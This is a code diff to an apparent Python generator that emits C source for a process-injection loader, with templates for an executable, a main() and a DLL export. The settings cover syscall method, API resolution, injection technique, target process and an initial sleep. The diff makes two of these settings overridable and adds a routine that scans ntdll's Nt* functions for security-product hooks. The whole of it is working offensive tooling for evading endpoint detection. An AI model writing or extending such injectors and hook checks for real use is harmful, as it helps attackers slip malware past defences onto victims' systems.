@@ -385,8 +385,12 @@ class CodeGenerator:
 // Build Configuration
 // ============================================================================
 
+#ifndef SYSCALL_METHOD
 #define SYSCALL_METHOD      SYSCALL_{self.config.syscall.upper()}
+#endif
+#ifndef RESOLVER_METHOD
 #define RESOLVER_METHOD     RESOLVER_{self.config.resolver.upper()}
+#endif
 #define INJECTION_METHOD    {inject_const}
 #define TARGET_PROCESS      L"{target_process}"
 #define INITIAL_SLEEP       {self.config.sleep}
@@ -777,8 +781,12 @@ int main(int argc, char** argv) {{
 // Build Configuration
 // ============================================================================
 
+#ifndef SYSCALL_METHOD
 #define SYSCALL_METHOD      SYSCALL_{self.config.syscall.upper()}
+#endif
+#ifndef RESOLVER_METHOD
 #define RESOLVER_METHOD     RESOLVER_{self.config.resolver.upper()}
+#endif
 #define INJECTION_METHOD    {inject_const}
 #define TARGET_PROCESS      L"{target_process}"
 #define INITIAL_SLEEP       {self.config.sleep}
@@ -1101,8 +1109,12 @@ __declspec(dllexport) void Run(void) {{
 // Build Configuration
 // ============================================================================
 
+#ifndef SYSCALL_METHOD
 #define SYSCALL_METHOD      SYSCALL_{self.config.syscall.upper()}
+#endif
+#ifndef RESOLVER_METHOD
 #define RESOLVER_METHOD     RESOLVER_{self.config.resolver.upper()}
+#endif
 #define INJECTION_METHOD    {inject_const}
 #define TARGET_PROCESS      L"{target_process}"
 #define INITIAL_SLEEP       {self.config.sleep}
@@ -3923,6 +3935,63 @@ LPVOID EncodeSystemPtr(LPVOID ptr) {
     ULONG  cookie  = *(ULONG*)0x7FFE0330;
     ULONG64 encoded = _rotr64((ULONG64)cookie ^ (ULONG64)ptr, cookie & 0x3F);
     return (LPVOID)encoded;
+}
+
+// ============================================================================
+// VerifyNoHooks
+// Walks all Nt* exports in ntdll.dll and checks the first 4 bytes against
+// the standard syscall stub preamble (4C 8B D1 B8).
+// Returns TRUE if no patches detected, FALSE if any hook is found.
+// ============================================================================
+
+BOOL VerifyNoHooks(VOID) {
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    if (!hNtdll)
+        return FALSE;
+
+    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
+    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + pDos->e_lfanew);
+    DWORD dwExpRVA = pNt->OptionalHeader
+                         .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+    if (!dwExpRVA)
+        return FALSE;
+
+    PIMAGE_EXPORT_DIRECTORY pExp =
+        (PIMAGE_EXPORT_DIRECTORY)((PBYTE)hNtdll + dwExpRVA);
+
+    PDWORD  pNames    = (PDWORD)((PBYTE)hNtdll + pExp->AddressOfNames);
+    PDWORD  pFuncs    = (PDWORD)((PBYTE)hNtdll + pExp->AddressOfFunctions);
+    PWORD   pOrdinals = (PWORD) ((PBYTE)hNtdll + pExp->AddressOfNameOrdinals);
+
+    DWORD dwHooked  = 0;
+    DWORD dwChecked = 0;
+
+    for (DWORD i = 0; i < pExp->NumberOfNames; i++) {
+        const char* szName = (const char*)((PBYTE)hNtdll + pNames[i]);
+        if (szName[0] != 'N' || szName[1] != 't')
+            continue;
+
+        dwChecked++;
+        PBYTE pFunc = (PBYTE)hNtdll + pFuncs[pOrdinals[i]];
+
+        // Standard stub preamble: 4C 8B D1 B8 <SSN>
+        if (pFunc[0] != 0x4C || pFunc[1] != 0x8B ||
+            pFunc[2] != 0xD1 || pFunc[3] != 0xB8) {
+#if DEBUG_BUILD
+            LOG_INFO("VerifyNoHooks: hook on %s (byte[0]=0x%02X)", szName, pFunc[0]);
+#endif
+            dwHooked++;
+        }
+    }
+
+#if DEBUG_BUILD
+    if (dwHooked == 0)
+        LOG_INFO("VerifyNoHooks: all %lu Nt* stubs clean", dwChecked);
+    else
+        LOG_INFO("VerifyNoHooks: %lu hook(s) detected", dwHooked);
+#endif
+
+    return (dwHooked == 0);
 }
 
 // ============================================================================
